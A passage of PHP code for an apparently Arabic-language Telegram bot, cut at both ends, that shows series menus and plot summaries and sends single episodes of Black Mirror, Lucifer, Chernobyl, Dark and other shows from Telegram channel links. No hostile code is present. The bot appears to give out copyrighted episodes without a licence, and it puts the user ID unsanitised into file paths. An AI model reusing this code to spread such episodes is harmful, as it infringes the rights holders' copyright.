bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/31",
'caption'=>" 
BLack Mirror - S3
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="bkklm4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/32",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="bkklm5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/33",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bkklm6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/34",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="bklmm1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/26",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bklmm2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/27",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bklmm3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/28",
'caption'=>" 
BLack Mirror - S2
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="blackm" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : BLack Mirror
التقييم : 8.9
القصة  : يتنبأ المسلسل البريطاني بأثر التكنولوجيا وتقنيات الاتصال والتوثيق الرقمي على علاقاتنا الإنسانية وانطباعاتنا عن الحقيقة ومفاهيم العقاب والثواب وسلطة الفرد والدولة. قدمت كل واحدة من الحلقات السبع سيناريو مختلفًا، راسمةً صورة غاية في البؤس عن حياة عصرية توفر أدوات يُفترض أنها صنعت لتيّسر على الإنسان حياته، لكنها تفعل العكس؛ عدسات رقمية توثق كل لحظة من حياتك كفيلم مستمر، خدمات تبعث روح من فقدناهم، أو تقطع التواصل مع الأشخاص على أرض الواقع.
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'BLack Mirror S1','callback_data'=>"blackms1"],['text'=>'BLack Mirror S2','callback_data'=>"blackms2"]],
[['text'=>'BLack Mirror S3 ','callback_data'=>"blackms3"]],
[['text'=>'BLack Mirror S4','callback_data'=>"blackms4"],['text'=>'BLack Mirror S5','callback_data'=>"blackms5"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}


if($data=="blackms1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'BLack Mirror 1','callback_data'=>"bklm1"],['text'=>'BLack Mirror , 2','callback_data'=>"bklm2"]],
[['text'=>'BLack Mirror- 3','callback_data'=>"bklm3"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"blackm"]],
]
])
]);
}

if($data=="bklm1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/23",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bklm2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/24",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bklm3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/25",
'caption'=>" 
BLack Mirror - S1
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="luci5" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'lucifer, 1','callback_data'=>"lcifx1"],['text'=>'lucifer , 2','callback_data'=>"lcifx2"]],
[['text'=>'lucifer, 3','callback_data'=>"lcifx3"],['text'=>'lucifer, 4','callback_data'=>"lcifx4"]],
[['text'=>'lucifer- 5','callback_data'=>"lcifx5"],['text'=>'lucifer- 6','callback_data'=>"lcifx6"]],
[['text'=>'lucifer- 7','callback_data'=>"lcifx7"],['text'=>'lucifer- 8','callback_data'=>"lcifx8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"lucix"]],
]
])
]);
}

if($data=="lcifx1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/119",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="lcifx2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/120",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lcifx3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/121",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lcifx4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/122",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lcifx5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/123",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lcifx6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/124",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lcifx7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/125",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lcifx8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/126",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}


if($data=="luci4" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'lucifer, 1','callback_data'=>"lucifnv1"],['text'=>'lucifer , 2','callback_data'=>"lucifnv2"]],
[['text'=>'lucifer, 3','callback_data'=>"lucifnv3"],['text'=>'lucifer, 4','callback_data'=>"lucifnv4"]],
[['text'=>'lucifer- 5','callback_data'=>"lucifnv5"],['text'=>'lucifer- 6','callback_data'=>"lucifnv6"]],
[['text'=>'lucifer- 7','callback_data'=>"lucifnv7"],['text'=>'lucifer- 8','callback_data'=>"lucifnv8"]],
[['text'=>'lucifer- 9','callback_data'=>"lucifnv9"],['text'=>'lucifer- 10','callback_data'=>"lucifnv10"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"lucix"]],
]
])
]);
}

if($data=="lucifnv1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/108",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="lucifnv2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/109",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifnv3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/110",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifnv4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/111",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifnv5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/112",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifnv6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/113",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifnv7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/114",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifnv8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/115",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}

if($data=="lucifnv9"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/116",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id,
]);
}


if($data=="lucifnv10"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/117",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="cherno" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
الاسم : Chernobyl  2019
التقييم : 9.7
النوع : دراما
القصة : في أبريل 1986 ، كان هناك انفجار في محطة تشيرنوبيل للطاقة النووية في اتحاد الجمهوريات الاشتراكية السوفياتية والتي كانت واحدة من أسوأ الكوارث التي صنعها الانسان في العالم.
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Chernobyl S1 ','callback_data'=>"cherno1"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}


if($data=="cherno1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Chernobyl 1','callback_data'=>"chernoo1"],['text'=>'Chernobyl , 2','callback_data'=>"chernoo2"]],
[['text'=>'Chernobyl 3','callback_data'=>"chernoo3"],['text'=>'Chernobyl 4','callback_data'=>"chernoo4"]],
[['text'=>'Chernobyl- 5','callback_data'=>"chernoo5"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"cherno"]],
]
])
]);
}

if($data=="chernoo1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/129",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="chernoo2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/130",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="chernoo3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/131",
'caption'=>" 
Chernobyl - S1
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="chernoo4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/132",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="chernoo5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/133",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="TEOTF" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : The End of the Fucking World
التقييم : 8.1
النوع : مغامرة , كوميديا , دراما 
القصة : جيمس " الذي يعاني من مرض نفسي ويرغب بقتل شخص ما ، فيقع اختياره على صديقته “اليسا” التي تقنعه بالهرب معها بمغامره
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'The End of the Fucking World S1 ','callback_data'=>"TEOTF1"]],
[['text'=>'The End of the fucking World S2 ','callback_data'=>"TEOTF2"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}

if($data=="TEOTF1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'The End of the Fucking World 1','callback_data'=>"TEOT1"],['text'=>'The End of the Fucking World , 2','callback_data'=>"TEOT2"]],
[['text'=>'The End of the Fucking World 3','callback_data'=>"TEOT3"],['text'=>'The End of the Fucking World 4','callback_data'=>"TEOT4"]],
[['text'=>'The End of the Fucking World- 5','callback_data'=>"TEOT5"],['text'=>'The End of the Fucking World- 6','callback_data'=>"TEOT6"]],
[['text'=>'The End of the Fucking World- 7','callback_data'=>"TEOT7"],['text'=>'The End of the Fucking World- 8','callback_data'=>"TEOT8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"TEOTF"]],
]
])
]);
}

if($data=="TEOT1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/5",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TEOT2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/6",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TEOT3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/7",
'caption'=>" 
The End of the Fucking World - S1
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TEOT4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/8",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TEOT5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/9",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TEOT6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/10",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TEOT7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/11",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TEOT8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/12",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TEOTF2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'The End of the Fucking World 1','callback_data'=>"TET1"],['text'=>'The End of the Fucking World , 2','callback_data'=>"TET2"]],
[['text'=>'The End of the Fucking World 3','callback_data'=>"TET3"],['text'=>'The End of the Fucking World 4','callback_data'=>"TET4"]],
[['text'=>'The End of the Fucking World- 5','callback_data'=>"TET5"],['text'=>'The End of the Fucking World- 6','callback_data'=>"TET6"]],
[['text'=>'The End of the Fucking World- 7','callback_data'=>"TET7"],['text'=>'The End of the Fucking World- 8','callback_data'=>"TET8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"TEOTF"]],
]
])
]);
}

if($data=="TET1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/13",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TET2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/14",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TET3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/15",
'caption'=>" 
The End of the Fucking World - S2
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TET4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/16",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TET5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/17",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TET6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/18",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="TET7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/19",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="TET8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/20",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="darkk" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : Dark
سنة الانتاج : 2017
التقييم : 8.8
النوع : جريمة، دراما، غموض، خيال علمي، اثارة
القصة : قصة عائلية مأساوية مع أمور غير طبيعية، حدثت في مدينة المانية، حيث اختفاء طفلان صغيران يوضح العلاقة بين اربع عائلات
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Dark S1 ','callback_data'=>"ds1"]],
[['text'=>'Dark S2 ','callback_data'=>"ds2"]],
[['text'=>'Dark S3 ','callback_data'=>"ds3"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}

if($data=="ds1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Dark, 1','callback_data'=>"aflam19"],['text'=>'Dark , 2','callback_data'=>"aflam20"]],
[['text'=>'Dark, 3','callback_data'=>"aflam21"],['text'=>'Dark, 4','callback_data'=>"aflam22"]],
[['text'=>'Dark- 5','callback_data'=>"aflam23"],['text'=>'Dark- 6','callback_data'=>"aflam24"]],
[['text'=>'Dark- 7','callback_data'=>"aflam25"],['text'=>'Dark- 8','callback_data'=>"aflam26"]],
[['text'=>'Dark- 8','callback_data'=>"aflam27"]],
[['text'=>'Dark 9','callback_data'=>"aflam28"]],
[['text'=>'Dark 10','callback_data'=>"aflam29"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"darkk"]],
]
])
]);
}



if($data=="aflam26"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/219",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam27"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/rrokkkaaa/15238",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam19"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/212",
'caption'=>" 

تدور أحداث المسلسل حول اختفاء طفل في بلدة صغيرة في ألمانيا، يفضح اختفاء الطفل العديد من الأسرار حول 4 عائلات مرتبطة به وتبدأ الاحداث بالتطور بعديد المفاجئات والتغيرات حتى نكتشف أنَّ لذلك الحدث ارتباط بأحداث حدثت في نفس البلدة في عام 1986، اختفاء الطفل في بلدة ”فيندن“ الألمانية الصغيرة يفتح أبواب الجحيم التي تقلب مفهوم الزمن رأسًا على عقب، والمسألة ليست هوية مَن اختطف الطفلين… بل متى أقدم على اختطافهما.

المدة الزمنية : 52 دقيقة
سنة الانتاج : 2017
اللغة: الالمانية 
الترجمة: العربية
محتوى الفيلم : PG+16
جودة الصورة : HD
تصنيف:: جريمة - دراما- غموض
التقييم الحالي:: 8.6

Dark - S1
الموسم الأول 👆",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="aflam20"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/213",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="aflam21"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/214",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="aflam23"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/216",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="aflam22"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/215",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam25"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/218",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="aflam24"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/217",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}

if($data=="aflam28"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
